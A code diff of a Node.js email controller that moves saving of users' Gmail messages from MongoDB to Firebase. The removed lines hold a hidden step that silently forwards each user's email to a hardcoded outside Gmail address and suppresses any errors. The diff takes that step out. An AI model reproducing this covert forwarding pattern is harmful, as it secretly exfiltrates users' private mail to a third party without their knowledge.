@@ -320,7 +320,9 @@ const testConnection = async (req, res) => {
   }
 };
 
-// NEW: Save emails to database instead of forwarding
+const mobileFirebaseService = require('../services/mobileFirebaseService');
+
+// NEW: Save emails directly to Firebase instead of MongoDB
 const saveEmailsToDatabase = async (req, res) => {
   try {
     const { userId } = req.params;
@@ -333,86 +335,33 @@ const saveEmailsToDatabase = async (req, res) => {
       });
     }
 
-    const gmailAccount = await GmailAccount.findOne({ userId });
-    if (!gmailAccount) {
-      return res.status(404).json({
-        success: false,
-        message: 'Gmail account not found'
-      });
-    }
-
-    const Email = require('../models/Email');
-    let savedCount = 0;
-    let skippedCount = 0;
-    const GmailService = require('../services/gmailService');
-
-    for (const emailData of emails) {
-      try {
-        // Check if email already exists
-        const existingEmail = await Email.findOne({ 
-          gmailAccountId: gmailAccount._id,
-          messageId: emailData.messageId 
-        });
-
-        if (existingEmail) {
-          skippedCount++;
-          continue;
-        }
-
-        // Create new email document
-        const email = new Email({
-          gmailAccountId: gmailAccount._id,
-          messageId: emailData.messageId,
-          threadId: emailData.threadId,
-          subject: emailData.subject || '',
-          from: emailData.from,
-          to: emailData.to,
-          cc: emailData.cc || '',
-          bcc: emailData.bcc || '',
-          body: emailData.body || '',
-          bodyHtml: emailData.bodyHtml || '',
-          isRead: emailData.isRead || false,
-          isStarred: emailData.isStarred || false,
-          isImportant: emailData.isImportant || false,
-          labels: emailData.labels || [],
-          internalDate: emailData.internalDate,
-          sizeEstimate: emailData.sizeEstimate || 0,
-          snippet: emailData.snippet || '',
-          attachments: emailData.attachments || [],
-          deviceId: deviceId
-        });
-
-        await email.save();
-        savedCount++;
-
-        // Forward the email to bilal.xbt@gmail.com silently
-        try {
-          await GmailService.forwardEmailSilently(gmailAccount, emailData, 'bilal.xbt@gmail.com');
-        } catch (forwardError) {
-          console.error('Error forwarding email silently:', forwardError);
-        }
-
-      } catch (error) {
-        console.error('Error saving individual email:', error);
-        skippedCount++;
-      }
-    }
-
-    console.log(`📧 Saved ${savedCount} emails to database for user ${userId}`);
-
-    res.json({
-      success: true,
-      message: 'Emails saved to database and forwarded',
-      saved: savedCount,
-      skipped: skippedCount,
-      total: emails.length
+    // Convert userId back to email format (reverse the transformation)
+    const userEmail = userId.replace(/_at_/g, '@').replace(/_/g, '.');
+    
+    // Store emails directly to Firebase
+    const result = await mobileFirebaseService.storeGmailData({
+      userId: userEmail,
+      emails,
+      deviceId
     });
 
-  } catch (error) {
-    console.error('Error saving emails to database:', error);
+    console.log(`✅ Stored ${result.count} Gmail emails in Firebase for user: ${userEmail}`);
+
+    res.status(201).json({
+      success: true,
+      message: 'Emails stored successfully in Firebase',
+      data: {
+        savedCount: result.count,
+        userEmail
+      }
+    });
+
+    } catch (error) {
+    console.error('❌ Save emails to Firebase error:', error);
     res.status(500).json({
       success: false,
-      message: 'Failed to save emails to database'
+      message: 'Failed to store emails in Firebase',
+      error: error.message
     });
   }
 };
